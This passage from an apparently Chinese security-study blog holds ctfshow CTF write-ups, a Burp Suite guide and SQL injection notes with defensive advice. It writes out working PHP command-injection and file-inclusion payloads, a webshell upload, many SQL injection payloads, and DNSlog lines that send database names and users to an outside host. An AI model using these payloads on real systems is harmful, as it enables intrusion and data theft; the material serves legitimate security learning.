src="C:\Users\wuxia\AppData\Roaming\Typora\typora-user-images\image-20250120182620571.png" alt="image-20250120182620571"></p><p>然后封闭一下可以正常回显</p><p>接着测试一下字段数</p><p><img src="C:\Users\wuxia\AppData\Roaming\Typora\typora-user-images\image-20250120182720411.png" alt="image-20250120182720411"></p><p><img src="C:\Users\wuxia\AppData\Roaming\Typora\typora-user-images\image-20250120182741323.png" alt="image-20250120182741323"></p><p>4不可以说明字段数是3</p><p>接着测试一下回显</p><p><img src="C:\Users\wuxia\AppData\Roaming\Typora\typora-user-images\image-20250120182943173.png" alt="image-20250120182943173"></p><p>发现三个回显都能正常回显</p><p>然后查看一下基本信息</p><p><img src="C:\Users\wuxia\AppData\Roaming\Typora\typora-user-images\image-20250120183357765.png" alt="image-20250120183357765"></p><p>接着查看一下数据库下的表</p><p><img src="C:\Users\wuxia\AppData\Roaming\Typora\typora-user-images\image-20250120183545581.png" alt="image-20250120183545581"></p><p>发现多出了一个表ctfshow_user3我们查看这个表中的列</p><p><img src="C:\Users\wuxia\AppData\Roaming\Typora\typora-user-images\image-20250120183713406.png" alt="image-20250120183713406"></p><p>然后查看id username password</p><p>检查发现没有flag</p><p>根据题目显示只查password</p><p><img src="C:\Users\wuxia\AppData\Roaming\Typora\typora-user-images\image-20250120184118638.png" alt="image-20250120184118638"></p><p>然后解得flag</p><h2 id="4-web29"><a href="#4-web29" class="headerlink" title="4.web29"></a>4.web29</h2><p>在结尾末尾加上&#x2F;？system(ls);</p><p><img src="C:\Users\wuxia\AppData\Roaming\Typora\typora-user-images\image-20250120192747175.png" alt="image-20250120192747175"></p><p>发现存在flag.php</p><p>然后用指令?c&#x3D;system(‘tac f*’);</p><p>查看flag</p><p><img src="C:\Users\wuxia\AppData\Roaming\Typora\typora-user-images\image-20250120193210128.png" alt="image-20250120193210128"></p><p>解得flag</p><h2 id="5-web30"><a href="#5-web30" class="headerlink" title="5.web30"></a>5.web30</h2><p>可以使用函数?c&#x3D;echo <code>tac f*</code>;</p><p>进行操作</p><p>点开题目看到</p><p><img src="C:\Users\wuxia\AppData\Roaming\Typora\typora-user-images\image-20250120200337840.png" alt="image-20250120200337840"></p><p>使用函数解得flag</p><p><img src="C:\Users\wuxia\AppData\Roaming\Typora\typora-user-images\image-20250120200436135.png" alt="image-20250120200436135"></p><h2 id="6-web31"><a href="#6-web31" class="headerlink" title="6.web31"></a>6.web31</h2><p><img src="C:\Users\wuxia\AppData\Roaming\Typora\typora-user-images\image-20250120200906061.png" alt="image-20250120200906061"></p><p>打开链接看到提示</p><p>发现这里又过滤了cat sort和空格以及，点，空格，单引号这些字符串</p><p>可通过嵌套eval函数来获取另一个参数的的方法来绕过</p><p>然后使用这串代码</p><p>c&#x3D;eval($_GET[a]);&amp;a&#x3D;system(‘cat flag.php’);</p><p>采取逃逸的方法解得flag</p><p><img src="C:\Users\wuxia\AppData\Roaming\Typora\typora-user-images\image-20250120201937741.png" alt="image-20250120201937741"></p><h2 id="7-web78"><a href="#7-web78" class="headerlink" title="7.web78"></a>7.web78</h2><p><img src="C:\Users\wuxia\AppData\Roaming\Typora\typora-user-images\image-20250120202351713.png" alt="image-20250120202351713"></p><p>发现存在文件包含函数include</p><p>然后用php伪协议读取flag源码</p><p><img src="C:\Users\wuxia\AppData\Roaming\Typora\typora-user-images\image-20250120202632766.png" alt="image-20250120202632766"></p><p>然后用base64解密</p><p><img src="C:\Users\wuxia\AppData\Roaming\Typora\typora-user-images\image-20250120202811336.png" alt="image-20250120202811336"></p><p>然后解得flag</p><h2 id="8-web79"><a href="#8-web79" class="headerlink" title="8.web79"></a>8.web79</h2><p><img src="C:\Users\wuxia\AppData\Roaming\Typora\typora-user-images\image-20250120203127881.png" alt="image-20250120203127881"></p><p>因为函数会替换php</p><p>所以使用伪协议会</p><p><img src="C:\Users\wuxia\AppData\Roaming\Typora\typora-user-images\image-20250120203321802.png" alt="image-20250120203321802"></p><p>所以看不到正确答案</p><p>?file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs&#x3D;</p><p>使用这串然后打开源代码解得flag</p><p><img src="C:\Users\wuxia\AppData\Roaming\Typora\typora-user-images\image-20250120203734226.png" alt="image-20250120203734226"></p><h2 id="9-web151"><a href="#9-web151" class="headerlink" title="9.web151"></a>9.web151</h2><p><img src="C:\Users\wuxia\AppData\Roaming\Typora\typora-user-images\image-20250120205010784.png" alt="image-20250120205010784"></p><p>先上传一个假图片然后抓包，然后修改包内容信息</p><p>然后用蚁剑链接后门即可得到flag</p><p><img src="C:\Users\wuxia\AppData\Roaming\Typora\typora-user-images\image-20250120205300617.png" alt="image-20250120205300617"></p><h2 id="10-web152"><a href="#10-web152" class="headerlink" title="10.web152"></a>10.web152</h2><p>和上一题思路一样链接，蚁剑即可打开flag</p><h2 id="11-crypto2"><a href="#11-crypto2" class="headerlink" title="11.crypto2"></a>11.crypto2</h2><p>下载附件之后打开看到的是以下符号</p><p><img src="C:\Users\wuxia\AppData\Roaming\Typora\typora-user-images\image-20250120210538142.png" alt="image-20250120210538142"></p><p>发现是jsfuck解码直接用浏览器控制台解码</p><p>解得flag</p><p><img src="C:\Users\wuxia\AppData\Roaming\Typora\typora-user-images\image-20250120211251503.png" alt="image-20250120211251503"></p><h2 id="12-crypto3"><a href="#12-crypto3" class="headerlink" title="12.crypto3"></a>12.crypto3</h2><p>打开附件是这样的乱码</p><p><img src="C:\Users\wuxia\AppData\Roaming\Typora\typora-user-images\image-20250120211421077.png" alt="image-20250120211421077"></p><p>和上一题操作一样直接F12打开浏览器控制台复制粘贴然后回车得到flag</p><p><img src="C:\Users\wuxia\AppData\Roaming\Typora\typora-user-images\image-20250120211915019.png" alt="image-20250120211915019"></p><h2 id="13-crypto3"><a href="#13-crypto3" class="headerlink" title="13.crypto3"></a>13.crypto3</h2><p>p&#x3D;447685307 q&#x3D;2037 e&#x3D;17  flag 为 flag{d}</p><p>题目为这个</p><p>说明我们需要求d</p><p>d: 53616899001</p><p>通过解码工具解得</p><p>解得flag为flag{53616899001}</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/WXR/2025/01/19/bp%E4%BD%BF%E7%94%A8%E6%89%8B%E5%86%8C/"/>
    <url>/WXR/2025/01/19/bp%E4%BD%BF%E7%94%A8%E6%89%8B%E5%86%8C/</url>
    
    <content type="html"><![CDATA[<h1 id="bp使用手册"><a href="#bp使用手册" class="headerlink" title="bp使用手册"></a>bp使用手册</h1><h2 id="1-下载挂载浏览器（也可以不需要）"><a href="#1-下载挂载浏览器（也可以不需要）" class="headerlink" title="1.下载挂载浏览器（也可以不需要）"></a>1.下载挂载浏览器（也可以不需要）</h2><p>在Linux系统里下载火狐浏览器</p><h2 id="2-打开系统终端输入指令burpsuite"><a href="#2-打开系统终端输入指令burpsuite" class="headerlink" title="2.打开系统终端输入指令burpsuite"></a>2.打开系统终端输入指令burpsuite</h2><p><img src="C:\Users\wuxia\AppData\Roaming\Typora\typora-user-images\image-20250113220345430.png" alt="image-20250113220345430"></p><p>会出现下面这个界面</p><h2 id="3-点击next和Start-Burp最后进入下面的界面"><a href="#3-点击next和Start-Burp最后进入下面的界面" class="headerlink" title="3.点击next和Start Burp最后进入下面的界面"></a>3.点击next和Start Burp最后进入下面的界面</h2><p><img src="C:\Users\wuxia\AppData\Roaming\Typora\typora-user-images\image-20250113220558590.png" alt="image-20250113220558590"></p><h2 id="4-bp的基本操作"><a href="#4-bp的基本操作" class="headerlink" title="4.bp的基本操作"></a>4.bp的基本操作</h2><h3 id="主要模块及用法"><a href="#主要模块及用法" class="headerlink" title="主要模块及用法"></a>主要模块及用法</h3><ul><li><p>Proxy 模块</p><p>：</p><ul><li><strong>拦截请求和响应</strong>：在“Intercept”选项卡中，可以启用和禁用拦截器，控制哪些请求被拦截。当拦截器启用时，所有通过代理的 HTTP&#x2F;HTTPS 请求和响应都会在这里显示，你可以查看、修改后再发送。</li><li><strong>查看历史记录</strong>：在“HTTP history”选项卡中，可以查看所有的 HTTP&#x2F;HTTPS 请求和响应，还可以对历史记录进行过滤、排序等操作，方便快速定位特定的请求和响应。</li><li><strong>匹配与替换</strong>：在“Match and Replace”选项卡中，可以使用正则表达式来替换 HTTP&#x2F;HTTPS 请求和响应中的文本，实现自动化处理，例如自动添加或删除某些请求头、修改参数值等。</li></ul></li><li><p>Target 模块</p><p>：</p><ul><li><strong>设置测试目标</strong>：通过“Site map”功能，可以以树状结构显示访问过的站点，方便对目标应用程序的资源和端点进行枚举和分析。右键点击站点地图中的节点，可以将其添加到范围内，从而减少其他内置工具的范围，专注于相关资源。</li><li><strong>添加爬行任务</strong>：可以对目标网站进行爬行，以发现更多的页面和资源。在爬行过程中，Burp Suite 会自动分析页面中的链接、表单等元素，并将其添加到站点地图中。</li></ul></li><li><p>Scanner 模块</p><p>：</p><ul><li><strong>新建扫描</strong>：选择“Scanner”模块，点击“New Scan”，输入扫描任务名称和目标网站 URL，然后点击“Start Scan”开始扫描。</li><li><strong>设置扫描范围和类型</strong>：在扫描设置中，可以自定义扫描策略，选择不同的扫描技术和策略，以适应不同的测试场景和需求。还可以设置扫描范围，包括或排除特定的 URL。</li><li><strong>查看扫描结果</strong>：扫描完成后，扫描结果会按照高、中、低三个级别进行分类显示，方便用户快速识别和定位漏洞。点击具体的漏洞，可以查看详细的漏洞信息、影响范围、修复建议等。</li></ul></li><li><p>Intruder 模块</p><p>：</p><ul><li><strong>选择攻击类型</strong>：Intruder 模块提供了多种攻击类型，包括 Sniper、Battering ram、Pitchfork、Cluster bomb 等，可以根据测试需求选择合适的攻击类型。</li><li><strong>设置载荷</strong>：在“Payloads”选项卡中，可以设置载荷类型，如 Runtime file、Custom iterator 等，并配置载荷的具体内容，如字典文件路径、载荷编码方式等。</li><li><strong>启动攻击</strong>：将要攻击的请求发送到 Intruder 模块中，配置好攻击类型和载荷后，点击“Start attack”按钮，Intruder 会按照设置的参数发送多个请求副本，并分析目标服务器的响应，帮助用户发现潜在的安全漏洞。</li></ul></li><li><p>Repeater 模块</p><p>：</p><ul><li><strong>发送请求</strong>：将需要重放的请求从其他模块（如 Proxy、Intruder 等）发送到 Repeater 模块中。</li><li><strong>编辑请求</strong>：在 Repeater 模块中，可以对请求的参数、请求方法、请求头等进行修改，以模拟不同的攻击场景。</li><li><strong>查看响应</strong>：修改请求后，点击“Send”按钮发送请求，然后查看响应结果，分析应用程序对不同请求的响应情况，从而帮助定位漏洞。</li></ul></li><li><p><strong>Comparer 模块</strong>：用于比较两个请求包或响应包的差异。将需要对比的包发送或者粘贴到 Comparer 中，然后可以选择对比文字或者字节的数据，帮助用户快速发现请求和响应之间的不同之处，对于分析漏洞的成因和影响范围非常有帮助。</p></li><li><p><strong>Decoder 模块</strong>：可以对字符串进行编码和解码，支持多种编码方式，如 URL 编码、HTML 实体编码、Base64、十六进制转换等。此外，还可以为常见的哈希函数创建消息摘要，如 MD2、MD5、SHA、SHA256、SHA512 等，方便用户在安全测试过程中进行数据转换和分析。</p></li></ul><h3 id="扩展功能"><a href="#扩展功能" class="headerlink" title="扩展功能"></a>扩展功能</h3><ul><li><strong>Extensions 模块</strong>：用于加载和管理 Burp Suite 的插件，以扩展其功能和特性。通过安装不同的插件，可以实现诸如自动化漏洞利用、增强扫描能力、美化界面等多种功能，提升安全测试的效率和效果。</li></ul>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/WXR/2025/01/19/sql%E6%95%B0%E6%8D%AE%E5%BA%93/"/>
    <url>/WXR/2025/01/19/sql%E6%95%B0%E6%8D%AE%E5%BA%93/</url>
    
    <content type="html"><![CDATA[<h1 id="sql数据库得知识点"><a href="#sql数据库得知识点" class="headerlink" title="sql数据库得知识点"></a>sql数据库得知识点</h1><h3 id="SQL语言操作"><a href="#SQL语言操作" class="headerlink" title="SQL语言操作"></a>SQL语言操作</h3><ul><li><p>数据查询（DQL - Data Query Language）</p><p>：</p><ul><li><strong>基本查询</strong>：使用<code>SELECT</code>语句从表中查询数据。例如<code>SELECT * FROM students;</code>表示查询学生信息表中的所有数据。</li><li><strong>条件查询</strong>：使用<code>WHERE</code>子句对查询结果进行条件过滤。例如<code>SELECT * FROM students WHERE age &gt; 18;</code>表示查询年龄大于18岁的学生信息。</li><li><strong>排序查询</strong>：使用<code>ORDER BY</code>子句对查询结果进行排序。例如<code>SELECT * FROM students ORDER BY age ASC;</code>表示按年龄升序排序查询学生信息。</li><li><strong>分组查询</strong>：使用<code>GROUP BY</code>子句对查询结果进行分组。例如<code>SELECT gender, COUNT(*) FROM students GROUP BY gender;</code>表示按性别分组统计学生数量。</li></ul></li><li><p>数据更新（DML - Data Manipulation Language）</p><p>：</p><ul><li><strong>插入数据</strong>：使用<code>INSERT INTO</code>语句向表中插入新的数据行。例如<code>INSERT INTO students (name, age, gender) VALUES (&#39;张三&#39;, 20, &#39;男&#39;);</code>表示向学生信息表中插入一条数据。</li><li><strong>更新数据</strong>：使用<code>UPDATE</code>语句对表中的数据行进行更新。例如<code>UPDATE students SET age = 21 WHERE name = &#39;张三&#39;;</code>表示将学生信息表中名字为“张三”的学生的年龄更新为21。</li><li><strong>删除数据</strong>：使用<code>DELETE FROM</code>语句从表中删除数据行。例如<code>DELETE FROM students WHERE age &gt; 22;</code>表示删除学生信息表中年龄大于22岁的学生信息。</li></ul></li><li><p>数据定义（DDL - Data Definition Language）</p><p>：</p><ul><li><strong>创建数据库</strong>：使用<code>CREATE DATABASE</code>语句创建一个新的数据库。例如<code>CREATE DATABASE school;</code>表示创建一个名为“school”的数据库。</li><li><strong>创建表</strong>：使用<code>CREATE TABLE</code>语句创建一个新的表。例如<code>CREATE TABLE students (id int PRIMARY KEY, name varchar(50), age int, gender char(1));</code>表示创建一个学生信息表，包含学号、姓名、年龄、性别等字段。</li><li><strong>修改表结构</strong>：使用<code>ALTER TABLE</code>语句对表的结构进行修改，如添加列、删除列、修改列的数据类型等。例如<code>ALTER TABLE students ADD email varchar(100);</code>表示向学生信息表中添加一个邮箱列。</li><li><strong>删除表</strong>：使用<code>DROP TABLE</code>语句删除表。例如<code>DROP TABLE students;</code>表示删除学生信息表。</li></ul></li><li><p>数据控制（DCL - Data Control Language）</p><p>：</p><ul><li><strong>授权</strong>：使用<code>GRANT</code>语句授予用户对数据库对象的访问权限。例如<code>GRANT SELECT, INSERT ON students TO user1;</code>表示授予用户“user1”对学生信息表的查询和插入权限。</li><li><strong>撤销授权</strong>：使用<code>REVOKE</code>语句撤销用户对数据库对象的访问权限。例如<code>REVOKE INSERT ON students FROM user1;</code>表示撤销用户“user1”对学生信息表的插入权限。</li></ul></li></ul><h1 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h1><h3 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h3><p>SQL注入是指攻击者通过在Web应用的输入框、URL参数等处插入恶意的SQL语句片段，当这些输入被Web应用不当处理并拼接到正常的SQL查询语句中执行时，从而实现对数据库的非法访问、数据篡改、数据泄露等恶意操作。</p><h3 id="工作原理"><a href="#工作原理" class="headerlink" title="工作原理"></a>工作原理</h3><ol><li><strong>输入恶意SQL片段</strong>：攻击者在Web应用的输入点，如登录表单的用户名、密码输入框，搜索框等，输入精心构造的SQL语句片段。例如，在用户名输入框中输入<code>&#39; OR 1=1 --</code>。</li><li><strong>拼接SQL语句</strong>：Web应用后端代码将用户输入与正常的SQL语句模板进行拼接。以登录功能为例，正常的SQL语句可能是<code>SELECT * FROM users WHERE username = &#39;$username&#39; AND password = &#39;$password&#39;</code>，当拼接上述恶意输入后，语句变为<code>SELECT * FROM users WHERE username = &#39;&#39; OR 1=1 -- AND password = &#39;$password&#39;</code>。</li><li><strong>执行恶意SQL语句</strong>：由于<code>--</code>是SQL注释符号，后面的<code>AND password = &#39;$password&#39;</code>被注释掉，最终执行的SQL语句相当于<code>SELECT * FROM users WHERE username = &#39;&#39; OR 1=1</code>，这将导致查询条件恒为真，返回数据库中所有用户的信息，攻击者从而可以获取到不该获取的数据。</li></ol><h3 id="常见危害"><a href="#常见危害" class="headerlink" title="常见危害"></a>常见危害</h3><ul><li><strong>数据泄露</strong>：攻击者可以查询数据库中的敏感信息，如用户个人信息、密码（尤其是明文存储的密码）、企业商业机密等。</li><li><strong>数据篡改</strong>：攻击者可以修改数据库中的数据，如修改用户权限、篡改交易记录、更改商品价格等，给企业和用户带来巨大损失。</li><li><strong>数据删除</strong>：攻击者可以删除数据库中的重要数据，导致数据丢失，影响业务的正常运行。</li><li><strong>权限提升</strong>：攻击者可能通过SQL注入获取更高权限的数据库账户，进一步控制数据库服务器，甚至入侵整个服务器系统。</li></ul><h3 id="防范措施"><a href="#防范措施" class="headerlink" title="防范措施"></a>防范措施</h3><ol><li><strong>使用参数化查询</strong>：这是最有效的防范SQL注入的方法之一。参数化查询将用户输入作为参数传递给SQL语句，而不是直接拼接在SQL语句中。例如，在PHP中使用PDO或mysqli的预处理语句功能，可以有效防止SQL注入。</li><li><strong>输入验证</strong>：对用户输入进行严格的验证，限制输入的类型、长度、格式等。例如，对于数字类型的输入，只允许输入数字字符；对于字符串类型的输入，限制长度，并过滤掉特殊字符，如单引号、双引号、分号等。</li><li><strong>使用ORM框架</strong>：对象关系映射（ORM）框架可以自动处理SQL语句的生成和执行，避免了手动拼接SQL语句，从而降低SQL注入的风险。常见的ORM框架有Hibernate、MyBatis等。</li><li><strong>最小权限原则</strong>：为数据库账户分配最小必要的权限，避免使用具有管理员权限的账户连接数据库。例如，对于只读的查询操作，使用只具有查询权限的账户。</li><li><strong>错误处理</strong>：合理处理数据库操作中的错误，避免将详细的错误信息直接显示给用户，因为这些错误信息可能包含数据库的结构等敏感信息，攻击者可以利用这些信息进行SQL注入攻击。</li></ol><h1 id="sql注入分类"><a href="#sql注入分类" class="headerlink" title="sql注入分类"></a>sql注入分类</h1><h2 id="一、sql注入概述"><a href="#一、sql注入概述" class="headerlink" title="一、sql注入概述"></a>一、sql注入概述</h2><p>SQL注入即是指web应用程序对用户输入数据的合法性没有判断或过滤不严，攻击者可以在web应用程序中事先定义好的查询语句的结尾上添加额外的SQL语句，在管理员不知情的情况下实现非法操作，以此来实现欺骗数据库服务器执行非授权的任意查询，从而进一步得到相应的数据信息,在实战和测试中，难免会遇见到一些sql注入，下面，我将总结一些常用sql注入中的不同姿势。</p><h2 id="二、寻找sql注入"><a href="#二、寻找sql注入" class="headerlink" title="二、寻找sql注入"></a>二、寻找sql注入</h2><p>测试注入点：</p><p>1.在参数后面添加单引号或双引号，查看返回包，如果报错或者长度变化，可能存在Sql注入</p><p>注入点判断：<code>id=1&#39;（常见）</code>id&#x3D;1” id&#x3D;1’) id&#x3D;1’)) id&#x3D;1”) id&#x3D;1”))</p><p>2.通过构造get、post、cookie请求再相应的http头信息等查找敏感喜喜</p><p>3.通过构造一些语句，检测服务器中响应的异常</p><h2 id="三、sql注入的类型"><a href="#三、sql注入的类型" class="headerlink" title="三、sql注入的类型"></a>三、sql注入的类型</h2><p>附上自己整理的思维导图学习</p><p><img src="https://image.3001.net/images/20220714/1657765090_62cf7ce22bc5cb101dc1b.png!small" alt="image"></p><p>常见的数据库类型，分为关系型数据库和非关系型数据库</p><p>关系型数据库有 <code>Oracle、DB2、PostgreSQL、Microsoft SQL Server、Microsoft Access 和 MySQL</code>等。</p><p>非关系型数据库有 <code>Neo4j、MongoDB、Redis、Memcached、MemcacheDB 和 HBase</code>等</p><h2 id="Mysql注入"><a href="#Mysql注入" class="headerlink" title="Mysql注入"></a>Mysql注入</h2><p><img src="https://image.3001.net/images/20220714/1657765211_62cf7d5ba9f990b10b6f3.png!small" alt="image"></p><h3 id="普通注入"><a href="#普通注入" class="headerlink" title="普通注入"></a>普通注入</h3><p>数字型：</p><p>测试步骤：</p><p>（1） 加单引号，URL：xxx.xxx.xxx&#x2F;xxx.php?id&#x3D;3’；</p><p>对应的sql：select * from table where id&#x3D;3’ 这时sql语句出错，程序无法正常从数据库中查询出数据，就会抛出异常；</p><p>（2） 加and 1&#x3D;1 ，URL：xxx.xxx.xxx&#x2F;xxx.php?id&#x3D;3 and 1&#x3D;1；</p><p>对应的sql：select * from table where id&#x3D;3’ and 1&#x3D;1 语句执行正常，与原始页面没有差异；</p><p>（3） 加and 1&#x3D;2，URL：xxx.xxx.xxx&#x2F;xxx.php?id&#x3D;3 and 1&#x3D;2；</p><p>对应的sql：select * from table where id&#x3D;3 and 1&#x3D;2 语句可以正常执行，但是无法查询出结果，所以返回数据与原始网页存在差异；</p><p>字符型</p><p>测试步骤：</p><p>（1） 加单引号：select * from table where name&#x3D;’admin’’；</p><p>由于加单引号后变成三个单引号，则无法执行，程序会报错；</p><p>（2） 加 ‘ and 1&#x3D;1 此时sql 语句为：select * from table where name&#x3D;’admin’ and 1&#x3D;1’ ，也无法进行注入，还需要通过注释符号将其绕过；</p><p>因此，构造语句为：select * from table where name &#x3D;’admin’ and 1&#x3D;–’ 可成功执行返回结果正确；</p><p>（3） 加and 1&#x3D;2— 此时sql语句为：select * from table where name&#x3D;’admin’ and 1&#x3D;2–’则会报错；</p><p>如果满足以上三点，可以判断该url为字符型注入。</p><p>判断列数：</p><p>?id&#x3D;1’ order by 4# 报错</p><p>?id&#x3D;1’ order by 3# 没有报错，说明存在3列</p><p>爆出数据库：</p><p>?id&#x3D;-1’ union select 1,database(),3–+</p><p>?id&#x3D;-1’ union select 1,group_concat(schema_name),3 from information_schema.schemata#</p><p>爆出数据表：</p><p>?id&#x3D;-1’ union select 1,group_concat(table_name),3 from information_schema.tables where table_schema&#x3D;’数据库’#</p><p>爆出字段：</p><p>?id&#x3D;-1’ union select 1,group_concat(column_name),3 from information_schema.columns where table_name&#x3D;’数据表’#</p><p>爆出数据值：</p><p>?id&#x3D;-1’ union select 1,group_concat(0x7e,字段,0x7e),3 from 数据库名.数据表名–+</p><p>拓展一些其他函数：</p><p>system_user() 系统用户名</p><p>user() 用户名</p><p>current_user 当前用户名</p><p>session_user()连接数据库的用户名</p><p>database() 数据库名</p><p>version() MYSQL数据库版本</p><p>load_file() MYSQL读取本地文件的函数</p><p>@@datadir 读取数据库路径</p><p>@@basedir MYSQL 安装路径</p><p>@@version_compile_os 操作系统</p><p>多条数据显示函数：</p><p>concat()、group_concat()、concat_ws()</p><h3 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h3><p>extractvalue函数：</p><p>?id&#x3D;1’ and extractvalue(1, concat(0x7e,(select @@version),0x7e))–+ (爆出版本号)</p><p>?id&#x3D;1’ and extractvalue(1, concat(0x7e,(select @@version_compile_os),0x7e))–+ (爆出操作系统)</p><p>?id&#x3D;1’ and extractvalue(1, concat(0x7e,(select schema_name from information_schema.schemata limit 5,1),0x7e))–+ （爆数据库）</p><p>?id&#x3D;1’ and extractvalue(1, concat(0x7e,(select table_name from information_schema.tables where table_schema&#x3D;’security’ limit 3,1),0x7e))–+ （爆数据表）</p><p>?id&#x3D;1’ and extractvalue(1, concat(0x7e,(select column_name from information_schema.columns where table_name&#x3D;’users’ limit 3,1),0x7e))–+（爆字段）</p><p>?id&#x3D;1’ and extractvalue(1, concat(0x7e,(select concat(id,0x7e,username,0x7e,password) from security.users limit 7,1),0x7e))–+ （爆数据）</p><p>updatexml函数：</p><p>细节问题： extractvalue()基本一样，改个关键字updatexml即可,与extractvalue有个很大的区别实在末尾注入加上，如：（1，concat(select @@version),1),而extractvalue函数末尾不加1（数值）</p><p>?id&#x3D;1’ and updatexml(1, concat(0x7e,(select schema_name from information_schema.schemata limit 5,1),0x7e),<strong><code>1</code></strong>)–+ （爆数据库）</p><p>?id&#x3D;1’ and updatexml(1, concat(0x7e,(select table_name from information_schema.tables where table_schema&#x3D;database() limit 3,1),0x7e),1)–+ （爆数据表）</p><p>?id&#x3D;1’ and updatexml(1, concat(0x7e,(select column_name from information_schema.columns where table_name&#x3D;’users’ limit 3,1),0x7e),1)–+ （爆字段）</p><p>?id&#x3D;1’ and updatexml(1, concat(0x7e,(select concat(id,0x7e,username,0x7e,password) from security.users limit 7,1),0x7e),1)–+</p><p>exp函数溢出错误：</p><p>在mysql&gt;5.5.53时，则不能返回查询结果</p><p>floor函数：</p><p>?id&#x3D;1’ union select 1,count(),concat(0x7e,(select database()),0x7e,floor(rand(0)2))a from information_schema.schemata group by a–+</p><p>?id&#x3D;1’ union select 1,count(),concat(0x7e,(select schema_name from information_schema.schemata limit 5,1),0x7e,floor(rand(0)2))a from information_schema.columns group by a–+ (爆数据库，不断改变limit得到其他)</p><p>?id&#x3D;1’ union select 1,count(),concat(0x7e,(select table_name from information_schema.tables where table_schema&#x3D;’security’ limit 3,1),0x7e,floor(rand(0)2))a from information_schema.columns group by a–+ （爆出users表）</p><p>?id&#x3D;1’ union select 1,count(),concat(0x7e,(select column_name from information_schema.columns where table_name&#x3D;’users’ limit 5,1),0x7e,floor(rand(0)2))a from information_schema.columns group by a–+ （爆出password字段）</p><p>?id&#x3D;1’ union select 1,count(),concat(0x7e,(select password from security.users limit 2,1),0x7e,floor(rand(0)2))a from information_schema.columns group by a–+ （爆出数值）</p><h3 id="延时注入"><a href="#延时注入" class="headerlink" title="延时注入"></a>延时注入</h3><p>判断注入点：</p><p>?id&#x3D;1’ and sleep(5)–+ &#x2F;&#x2F;正常休眠</p><p>?id&#x3D;1” and sleep(5)–+ &#x2F;&#x2F;无休眠</p><p>?id&#x3D;1’) and sleep(5)–+&#x2F;&#x2F;无休眠</p><p>?id&#x3D;1”) and sleep(5)–+&#x2F;&#x2F;无休眠</p><p>?id&#x3D;1’ and if(length(database())&#x3D;8,sleep(10),1)–+</p><p>爆出数据库：</p><p>?id&#x3D;1’ and if(ascii(substr(database(),1,1))&#x3D;115,1,sleep(10))–+</p><p>通过判断服务器没有睡眠，ascii码转换115为s ，那么就得出数据库第一个字符为s,下面就可以一次类推了,就不一</p><p>substr(database(),N,1)可以通过改变N的值来判断数据的地几个字符为什么</p><p>爆出数据表：</p><p>?id&#x3D;1’ and if((select ascii(substr((select table_name from information_schema.tables where table_schema&#x3D;”security”limit 0,1),1,1)))&#x3D;101,sleep(5),1)– -</p><p>解释：security的第一张表的第一个字符ascii为101，为字符e</p><p>limit 0,1),N,1还是改变N的的得出第二个字符</p><p>再判断字符（ascii判断）</p><p>?id&#x3D;1” and if(ascii(substr(database(),1,1))&gt;115,1,sleep(3))–+</p><p>（left语句判断）</p><p>?id&#x3D;1’ and if(left(database(),1)&#x3D;’s’,sleep(10),1) –+</p><p>?id&#x3D;1’ and if(left(database(),2)&#x3D;’sa’,sleep(10),1) –+</p><p>Substring函数判断</p><p>type&#x3D;if(substring((select table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1),1,1&#x3D;’a’),11111,sleep(1))–+</p><h3 id="布尔注入"><a href="#布尔注入" class="headerlink" title="布尔注入"></a>布尔注入</h3><p>Left判断</p><p>?id&#x3D;1’ and left(database(),1)&#x3D;’s’ –+</p><p>?id&#x3D;1’ and left(database(),2) &gt; ‘sa’ –+</p><p>Like语句判断</p><p>?id&#x3D;1’ and (select table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1)like ‘e%’–+</p><p>Ascii语句判断</p><p>and ascii(substr((select table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1),1,1))&#x3D;115–+</p><h3 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h3><p>?id&#x3D;1’ order by 3%23</p><p>?id&#x3D;1’;show tables%23</p><p>?id&#x3D;-1’;show columns from <code>1919810931114514</code>%23</p><p>?id&#x3D;1’; insert into users(id,username,password) values(88,’aaa’,’bbb’)#<br><img src="https://image.3001.net/images/20220714/1657765459_62cf7e536914d9a20eebd.png!small" alt="image"></p><h3 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h3><p>二次注入一般是用于白盒测试、黑盒测试就算是找到注入也没办法攻击。<br><img src="https://image.3001.net/images/20220714/1657765520_62cf7e901e5532a44c092.png!small" alt="image"></p><h3 id="加密解密注入"><a href="#加密解密注入" class="headerlink" title="加密解密注入"></a>加密解密注入</h3><p>Cookie: uname&#x3D;YWRtaW4%3D</p><p>YWRtaW4%3D这是一个base64加密的字符串其中%3D是编码中的&#x3D;符号，把他发送到编码模块当中解密,得到明文</p><p>发现这个是注入点需要将原来的注入方式重新加密发送给服务器，可以构造注入语句进行base64加密进行报错注入</p><p><img src="https://image.3001.net/images/20220714/1657765539_62cf7ea3330691d8a8415.png!small" alt="image"></p><h3 id="Dnslog对外注入"><a href="#Dnslog对外注入" class="headerlink" title="Dnslog对外注入"></a>Dnslog对外注入</h3><p>通常我们面对SQL注入过程中没有回显的情况下，只能通过盲注的方式来判断是否存在SQL注入，但是，使用盲注，手工测试是需要花费大量的时间的，可能会想到使用sqlmap直接去跑出数据，但在实际测试中，使用sqlmap跑盲注，有很大的几率，网站把ip给封掉，这就影响了我们的测试进度，也许你也可以使用代理池</p><p>注入语句：</p><p>?id&#x3D;1’ and (select load_file(concat(‘&#39;,(select hex(user())),’.682y4b.dnslog.cn&#x2F;abc’))) –+</p><p>?id&#x3D;1’ and (select load_file(concat(‘&#39;,(select database()),’.682y4b.dnslog.cn&#x2F;abc’))) –+</p><h3 id="中转注入"><a href="#中转注入" class="headerlink" 